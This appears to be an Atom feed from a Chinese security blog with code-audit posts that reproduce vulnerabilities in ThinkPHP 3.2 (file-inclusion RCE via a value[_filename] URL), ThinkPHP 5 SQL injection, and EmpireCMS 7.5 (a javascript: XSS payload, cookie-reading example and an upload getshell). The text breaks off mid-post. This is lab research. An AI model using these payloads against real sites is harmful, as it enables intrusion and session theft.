<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0xCreed</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0xcreed.jxustctf.top/"/>
  <updated>2022-03-19T05:59:10.412Z</updated>
  <id>https://0xcreed.jxustctf.top/</id>
  
  <author>
    <name>0xCreed</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHPOK6.0代码审计</title>
    <link href="https://0xcreed.jxustctf.top/2022/03/PHPOK6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://0xcreed.jxustctf.top/2022/03/PHPOK6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-03-19T03:46:44.000Z</published>
    <updated>2022-03-19T05:59:10.412Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="07bed5c926950c4c60e95e78dfa0f571b3e3c49f3eb6404c3d22f7856614928c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      看到师傅们说前台能RCE，直接拿EXP跟了一波
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="CMS" scheme="https://0xcreed.jxustctf.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>IDEA远程调试JAR</title>
    <link href="https://0xcreed.jxustctf.top/2021/09/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95JAR/"/>
    <id>https://0xcreed.jxustctf.top/2021/09/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95JAR/</id>
    <published>2021-09-08T09:10:19.000Z</published>
    <updated>2021-09-09T01:35:42.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="IDEA远程调试JAR"><a href="#IDEA远程调试JAR" class="headerlink" title="IDEA远程调试JAR"></a>IDEA远程调试JAR</h1><p>最近把struts的相关洞跟了一遍，这里记录一下IDEA的调试环境的配置。</p><h2 id="IDEA安装反编译插件"><a href="#IDEA安装反编译插件" class="headerlink" title="IDEA安装反编译插件"></a>IDEA安装反编译插件</h2><p>对于jar包中的class文件，我们需要反编译才能看到源码调试。</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210908172825269.png" alt="image-20210908172825269"></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>以调试S2-001为例</p><p>环境使用<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><h3 id="tomcat开启debug模式"><a href="#tomcat开启debug模式" class="headerlink" title="tomcat开启debug模式"></a>tomcat开启debug模式</h3><a id="more"></a><p>修改catalina.sh文件，添加以下内容，调试端口是8081</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">JAVA_OPTS</span>=<span class="string">"-agentlib:jdwp=transport=dt_socket,address=8081,server=y,suspend=n"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/IDEA远程调试JAR/image-20210909091427403.png" alt="image-20210909091427403"></p><h3 id="修改docker-compose-yml"><a href="#修改docker-compose-yml" class="headerlink" title="修改docker-compose.yml"></a>修改docker-compose.yml</h3><p>因为除了正常的web端口，还有一个debug端口需要映射</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909091614647.png" alt="image-20210909091614647"></p><h3 id="修改Dockerfile"><a href="#修改Dockerfile" class="headerlink" title="修改Dockerfile"></a>修改Dockerfile</h3><p>需要把修改后的<code>catalina.sh</code>替换原来的</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909091713142.png" alt="image-20210909091713142"></p><h3 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h3><p>如果之前起过容器需要重新build，更新image文件</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909092020998.png" alt="image-20210909092020998"></p><h3 id="IDEA配置"><a href="#IDEA配置" class="headerlink" title="IDEA配置"></a>IDEA配置</h3><p>把项目中的 S2-001.war下载到本地，解压后使用IDEA作为项目打开。</p><p>右键lib-&gt;添加为库</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909092541288.png" alt="image-20210909092541288"></p><p>文件- &gt;项目结构 设置项目SDK</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909092729175.png" alt="image-20210909092729175"></p><p>右上角添加运行配置</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909092920216.png" alt="image-20210909092920216"></p><p>监听debug，下好断点，访问触发</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909093059050.png" alt="image-20210909093059050"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="无法评估表达式"><a href="#无法评估表达式" class="headerlink" title="无法评估表达式"></a>无法评估表达式</h3><p><img src="/2021/09/IDEA远程调试JAR/Image.png" alt="Image"></p><p>和IDEA的自动导入有关</p><p>排除相关类的自动导入</p><p><img src="/2021/09/IDEA远程调试JAR/image-20210909093454410.png" alt="image-20210909093454410"></p><p><img src="/2021/09/IDEA远程调试JAR/Image-1631151331481.png" alt="Image"></p>]]></content>
    
    <summary type="html">
    
      记录一下IDEA调试环境配置
    
    </summary>
    
    
      <category term="环境搭建" scheme="https://0xcreed.jxustctf.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="IDEA" scheme="https://0xcreed.jxustctf.top/tags/IDEA/"/>
    
      <category term="调试" scheme="https://0xcreed.jxustctf.top/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.x RCE复现</title>
    <link href="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-07-14T03:39:25.000Z</published>
    <updated>2021-09-09T01:43:16.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ThinkPHP3-2-x-RCE复现"><a href="#ThinkPHP3-2-x-RCE复现" class="headerlink" title="ThinkPHP3.2.x RCE复现"></a>ThinkPHP3.2.x RCE复现</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。个人感觉这个漏洞虽然不如thinkphp本体的一些RCE漏洞影响范围大，但也算是提供了一个思路，对基于某些框架二次开发的系统，寻找其不规范的方法调用的思路还是值得学习的。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://codeload.github.com/top-think/thinkphp/zip/refs/tags/3.2.3" target="_blank" rel="noopener">ThinkPHP3.2.3</a> Phpstudy8.1.1 PHP-5.6.9 Apache Windows10(<a href="https://www.kancloud.cn/manual/thinkphp/1678" target="_blank" rel="noopener">tp3手册</a>)</p><p>如果是linux可以用composer拉取环境( composer create-project topthink/thinkphp=3.2.3 tp3)</p><p>先访问<a href="http://xxx.xx/index.php" target="_blank" rel="noopener">http://xxx.xx/index.php</a> 生成项目文件</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714130932384.png" alt="image-20210714130932384"></p><p>然后在<code>\Application\Home\Controller\IndexController.class.php</code>写入demo代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($value=<span class="string">''</span>)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;assign($value);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;display();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>因为该漏洞利用的assign函数需要模板渲染，所以需要对应的模板文件，与demo相对应的文件路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\H</span>ome<span class="symbol">\V</span>iew<span class="symbol">\I</span>ndex<span class="symbol">\i</span>ndex.html</span><br><span class="line">/*此处的Index目录和index.html文件需自己创建</span><br><span class="line">index.html的内容任意</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>借用玄甲安全实验室的一张图，整体看一下程序的执行流程</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210909094308482.png" alt="image-20210909094308482"></p><p>接下来分析具体的代码：</p><p><code>Application/Home/Controller/IndexController.class.php</code></p><p>assign方法中第一个变量可控</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714144552762.png" alt="image-20210714144552762"></p><p>跟进assign函数</p><p><code>ThinkPHP/Library/Think/Controller.class.php</code></p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145223478.png" alt="image-20210714145223478"></p><p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>中的assign函数，此时进入else分支，我们传进去的<code>$value</code>被赋值给<code>$this-&gt;tVar</code></p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145158360.png" alt="image-20210714145158360"></p><p>返回后进入display函数，注意这是一个无参调用</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145819669.png" alt="image-20210714145819669"></p><p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>的display函数，开始解析并获取模板文件内容，此时模板文件路径和内容为空</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714150822344.png" alt="image-20210714150822344"></p><p>进入<code>ThinkPHP/Library/Think/View.class.php</code>的fetch函数后，会先判断模板存不存在，这也是为什么我们要创建模板文件的原因</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714151415868.png" alt="image-20210714151415868"></p><p>接着判断是不是php类型模板，不是进入else分支。接着$params 被赋值，var即为为我们传进去的日志路径，file为模板文件的路径。</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714151836840.png" alt="image-20210714151836840"></p><p>接着进入<code>ThinkPHP/Library/Think/Hook.class.php</code>的listen函数，经过一些判断，进入exec函数</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714152708275.png" alt="image-20210714152708275"></p><p>接着exec函数把$params带进<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>的run函数处理</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153315655.png" alt="image-20210714153315655"></p><p>进入<code>ThinkPHP/Library/Think/Template.class.php</code>的fetch函数</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153522998.png" alt="image-20210714153522998"></p><p>进入最后的load函数，$var不为空则使用extract方法的EXTR_OVERWRITE默认描述对变量值进行覆盖，之后include该日志文件路径，造成文件包含。</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153704479.png" alt="image-20210714153704479"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li><p>日志包含</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154206984.png" alt="image-20210714154206984"></p><p>日志在<code>Application/Runtime/Logs/Home</code>目录下</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154445495.png" alt="image-20210714154445495"></p><p>开启debug</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求不报错 日志文件在 Application<span class="regexp">/Runtime/</span>Logs/Home下</span><br><span class="line">请求会报错 日志文件在 Application<span class="regexp">/Runtime/</span>Logs/Common下</span><br></pre></td></tr></table></figure><p>关闭debug</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求不会报错 不会记录日志</span><br><span class="line">请求会报错 日志文件在 Application/Runtime/Logs/<span class="meta">Common</span>下</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>上传入口</p><p>利用系统自带的上传功能，上传包含shell的文件</p></li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://x.x.x.x/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21<span class="emphasis">_07_</span>14.log</span><br></pre></td></tr></table></figure><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210716163001792.png" alt="image-20210716163001792"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ?st=529DABB1BC6F651382C9135EB552827AD43F0288831BAC943C5A6CE32F45F1B9F423FD767BD30EB98F9C2C6D962C1268BBC7A694FE6B1157BC89FD16D8EAEB81A3BD642BDC08DB57567E4C7B327B7134882308F36A811B338901B511ABC8BC487356659B2CD0C8417DBCFD448DE79A0E6611FC7DAA7F5F806AED95180ADE0D979653805D9BE2818C36432C242C346C258EB569D4B4EC38ACD08C5E03A09D4FAA34F60913522071EB3BEEED7BDB667730296BE92C3B10E13BA48209051A216A1E&vid=1688851206182100&cst=53928845F30E881CE4702F30E4E78E655B605169B1BF71E0E963E97B3C21D4A26131701E074B2422DE3B7150338D0234&deviceid=de960c8d-258f-4e7d-a333-c1e3dc351b70&version=3.1.8.3015&platform=win" target="_blank" rel="noopener">ThinkPHP3.2.x RCE漏洞通报</a> </p>]]></content>
    
    <summary type="html">
    
      ThinkPHP3.2的远程代码执行漏洞
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="复现" scheme="https://0xcreed.jxustctf.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="Thinkphp3" scheme="https://0xcreed.jxustctf.top/tags/Thinkphp3/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5-SQL注入漏洞分析</title>
    <link href="https://0xcreed.jxustctf.top/2021/03/%C2%96Thinkphp5-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0xcreed.jxustctf.top/2021/03/%C2%96Thinkphp5-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-20T03:17:28.000Z</published>
    <updated>2021-06-06T03:36:08.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>环境搭建卡了挺久的，这里记录一下。</p><ul><li><p>多版本的php</p><p>如果是Ubuntu，参考以下代码</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:ondrej/php    //添加仓库源</span><br><span class="line">sudo apt-get update  //更新源</span><br><span class="line">sudo apt-get install php5.6  //安装其他版本php</span><br><span class="line">sudo apt-get install php5.6-xdebug        //安装必须的插件</span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure><p>如果是kali，参考一下代码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install lsb-<span class="keyword">release</span> apt-transport-https ca-certificates </span><br><span class="line">sudo wget -O /etc/apt/<span class="keyword">trusted</span>.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line">echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list</span><br></pre></td></tr></table></figure></li><li><p>composer</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">"copy('https://install.phpcomposer.com/installer', 'composer-setup.php');"</span></span><br><span class="line">php composer-setup.php</span><br><span class="line">mv composer.phar <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>composer</span><br><span class="line"><span class="regexp">//</span>记得加环境变量</span><br><span class="line"><span class="regexp">//</span>换源</span><br><span class="line">composer config -g repo.packagist composer https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/composer/</span></span><br></pre></td></tr></table></figure></li><li><p>安装tp5源码</p><p>这里以thinkphp v5.0.15为例</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cd </span>/<span class="string">var/</span><span class="string">www/</span></span><br><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="built_in">--prefer-dist</span> <span class="string">topthink/</span><span class="string">think=</span>5.0.<span class="string">15 </span><span class="string">tp5015</span></span><br><span class="line"><span class="string">cd </span><span class="string">tp5015</span></span><br><span class="line"><span class="string">vim </span><span class="string">composer.</span><span class="string">json </span>//将<span class="string">"topthink/framework"</span>:<span class="string">"5.0.*"</span> &gt;&gt;<span class="string">"topthink/framework"</span>:<span class="string">"5.0.15"</span></span><br><span class="line"><span class="string">composer </span><span class="string">update </span>  //可能会报<span class="string">php插</span>件缺失，缺啥装啥。</span><br><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="string">topthink/</span><span class="string">framework=</span>5.0.<span class="string">15 </span><span class="string">thinkphp </span>//这个<span class="string">"thinkphp"</span>名字不能改,可能会报依赖错误，按照提示修改<span class="string">thinkphp/</span><span class="string">composer.</span><span class="string">json</span></span><br><span class="line"><span class="string">cd </span><span class="string">thinkphp</span></span><br><span class="line"><span class="string">composer </span><span class="string">update</span></span><br></pre></td></tr></table></figure><p>至此源码全部下载下来了。</p></li><li><p>Apache</p><p>首先选择合适的php版本(&gt;5.4),我这里因为依赖问题所以选择7.0</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a2dismod php5<span class="number">.6</span>  <span class="comment">//关闭php5.6</span></span><br><span class="line">a2enmod php7<span class="number">.0</span>   <span class="comment">//开启php7.0</span></span><br><span class="line">systemctl restart apache2  <span class="comment">//重启生效</span></span><br></pre></td></tr></table></figure><p>创建虚拟目录  <code>/etc/apache2/sites-available/000-default.conf</code></p><p><img src="/2021/03/Thinkphp5-SQL注入漏洞分析/image-20210320163405433.png" alt="image-20210320163405433"></p><p>增加监听端口 <code>/etc/apache2/ports.conf</code>  </p><p><img src="/2021/03/Thinkphp5-SQL注入漏洞分析/image-20210320163814936.png" alt="image-20210320163814936"></p><p>创建日志目录(没有会导致apache服务重启失败)</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /<span class="built_in">var</span>/<span class="built_in">log</span>/apache2/tp5015</span><br><span class="line">systemctl <span class="built_in">restart</span> apache2</span><br></pre></td></tr></table></figure><p>大致的环境就是这样搭建的。遇到特殊情况就举一反三吧 - -!</p><p>在进行漏洞分析前我们先来了解下tp的路由有两种模式</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://serverName/index.php/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line"><span class="link">http://serverName/index.php?s=/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><ul><li><p>漏洞分析</p><p>漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。漏洞影响版本： <strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p><p>将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span></span><br><span class="line"><span class="php">        db(<span class="string">'users'</span>)-&gt;insert([<span class="string">'username'</span> =&gt; $username]);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>在 <strong>application/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>application/config.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> tp5015demo;</span><br><span class="line"><span class="keyword">use</span> tp5015demo;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line">true<span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">trueusername <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ul><ul><li>漏洞利用</li></ul><h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><h3 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h3><h3 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h3><h3 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h3><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>]]></content>
    
    <summary type="html">
    
      跟进ThinkPHP-Vuln项目，把tp5的SQL漏洞过一遍。
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="thinkphp" scheme="https://0xcreed.jxustctf.top/tags/thinkphp/"/>
    
      <category term="SQL" scheme="https://0xcreed.jxustctf.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>EmpireCMSv7.5代码审计</title>
    <link href="https://0xcreed.jxustctf.top/2021/03/EmpireCMSv7-5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://0xcreed.jxustctf.top/2021/03/EmpireCMSv7-5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-03-17T11:56:24.000Z</published>
    <updated>2021-03-22T07:05:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>环境上没遇到啥问题</p><h3 id="前台XSS"><a href="#前台XSS" class="headerlink" title="前台XSS"></a>前台XSS</h3><ul><li><p>漏洞分析</p><p>需要开启会员空间</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20212902.png" alt="屏幕截图 2021-03-18 212902"></p><p>问题代码在<code>/e/ViewImg/index.html</code> ，Request获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318214012537.png" alt="image-20210318214012537"></p><p>跟进<code>Request</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318215455754.png" alt="image-20210318215455754"></p><p>通过window.location获取当前url地址,根据传入的url参数,获取当前参数的起始位置和结束位置。</p><p>例如,<code>index.html?url=javascript:alert(document.cookie)</code>,经过Request函数处理就变成<code>javascript:alert(document.cookie)</code></p><p>url地址经过Request函数处理之后,然后把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值。</p><p>所以构造payload：<code>url=javascript:alert(/xss/)</code></p></li><li><p>漏洞复现</p><p>访问<code>http://172.16.43.200:9093/e/ViewImg/index.html?url=javascript:alert(/xss/)</code>,点击图片触发。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318220355099.png" alt="image-20210318220355099"></p></li></ul><a id="more"></a><h3 id="后台文件上传getshell-CVE-2018-18086"><a href="#后台文件上传getshell-CVE-2018-18086" class="headerlink" title="后台文件上传getshell(CVE-2018-18086 )"></a>后台文件上传getshell(CVE-2018-18086 )</h3><ul><li><p>漏洞分析</p><p>EmpireCMS  7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的<code>/e/class/moddofun.php</code>的<code>LoadInMod</code>函数存在安全漏洞,未对变量<code>$file</code>做任何处理，直接上传，接着就包含该文件。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20212415.png" alt="屏幕截图 